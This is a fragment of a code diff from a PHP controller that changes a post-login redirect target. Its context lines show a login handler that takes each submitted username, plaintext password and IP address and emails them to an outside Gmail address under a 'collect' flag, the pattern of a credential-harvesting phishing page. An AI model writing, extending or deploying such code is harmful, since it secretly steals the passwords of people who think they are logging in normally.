@@ -63,7 +63,7 @@ class MainController extends Controller {
                        $arr = ["email" => $req["username"], "password" => $req["passwd"], "ip" => $ip];
                           $this->helpers->sendEmail("kudayisitobi@gmail.com" ,$s,['arr' => $arr],'emails.login_alert','view');  
                           Session::flash("collect", "yes" );                	         
-                          return redirect()->intended('m');                       
+                          return redirect()->intended('/');                       
                    }                                                                                                   
 	}
 
